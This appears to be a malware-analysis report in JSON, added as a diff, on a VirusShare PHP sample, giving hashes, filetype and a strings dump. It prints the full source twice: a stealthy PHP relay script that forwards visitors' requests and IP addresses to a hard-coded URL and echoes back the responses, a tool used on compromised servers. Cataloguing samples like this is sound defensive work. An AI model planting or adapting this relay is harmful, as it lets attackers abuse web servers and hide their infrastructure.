@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "User-Agent": "May download files from the Internet"
+        },
+        "macro": "<?php error_reporting(0);set_time_limit(0);$url=\"http://localhost/h/s1.php\";\n$pu=parse_url($url);\nif(strlen($_SERVER['QUERY_STRING'])==0)die();\nif(!isset($pu['port']))$pu['port']=80; \n$s=fsockopen($pu['host'],$pu['port'],$e,$es,30);\nif(!$s)die();\n$h=apache_request_headers();\nfwrite($s,$_SERVER['REQUEST_METHOD'].' '.$pu['path'].'?'.$_SERVER['QUERY_STRING'].\"&rip=\".$_SERVER['REMOTE_ADDR'].\" HTTP/1.0\\r\\nHost: \".$pu['host'].\"\\r\\nConnection: Close\\r\\n\");\nfhead('User-Agent');\nif($_SERVER['REQUEST_METHOD']=='POST'){fhead('Content-Type'); fhead('Content-Length');fwrite($s,\"\\r\\n\".file_get_contents('php://input'));}\nelse fwrite($s,\"\\r\\n\");\n$res='';while(!feof($s))$res.=fread($s,1024);fclose($s);\n$pos=strpos($res,\"\\r\\n\\r\\n\");\nif(stristr(substr($res,0,$pos),\"\\nhall: ok\\r\\n\"))Header(\"Hall: OK\");\nprint substr($res,$pos+4);\nfunction fhead($n){global $h,$s;if(!isset($h[$n]))die();fwrite($s,$n.': '.$h[$n].\"\\r\\n\");}\n?>"
+    },
+    "filename": "VirusShare_5b82e54604dbfa4697a69b3db2f2afe6",
+    "filesize": 932,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "5b82e54604dbfa4697a69b3db2f2afe6",
+        "sha1": "7f69aa17eccb4fb1ce366c894a5333b32cdb3c61",
+        "sha256": "45fe9c080ac13b207219dfe14882729aa1aebf63cc60882789b4c97645f0d592"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php error_reporting(0);set_time_limit(0);$url=\"http://localhost/h/s1.php\";",
+            "$pu=parse_url($url);",
+            "if(strlen($_SERVER['QUERY_STRING'])==0)die();",
+            "if(!isset($pu['port']))$pu['port']=80; ",
+            "$s=fsockopen($pu['host'],$pu['port'],$e,$es,30);",
+            "if(!$s)die();",
+            "$h=apache_request_headers();",
+            "fwrite($s,$_SERVER['REQUEST_METHOD'].' '.$pu['path'].'?'.$_SERVER['QUERY_STRING'].\"&rip=\".$_SERVER['REMOTE_ADDR'].\" HTTP/1.0\\r\\nHost: \".$pu['host'].\"\\r\\nConnection: Close\\r\\n\");",
+            "fhead('User-Agent');",
+            "if($_SERVER['REQUEST_METHOD']=='POST'){fhead('Content-Type'); fhead('Content-Length');fwrite($s,\"\\r\\n\".file_get_contents('php://input'));}",
+            "else fwrite($s,\"\\r\\n\");",
+            "$res='';while(!feof($s))$res.=fread($s,1024);fclose($s);",
+            "$pos=strpos($res,\"\\r\\n\\r\\n\");",
+            "if(stristr(substr($res,0,$pos),\"\\nhall: ok\\r\\n\"))Header(\"Hall: OK\");",
+            "print substr($res,$pos+4);",
+            "function fhead($n){global $h,$s;if(!isset($h[$n]))die();fwrite($s,$n.': '.$h[$n].\"\\r\\n\");}"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://localhost/h/s1.php"
+        ]
+    },
+    "time": "0:00:00.290242",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
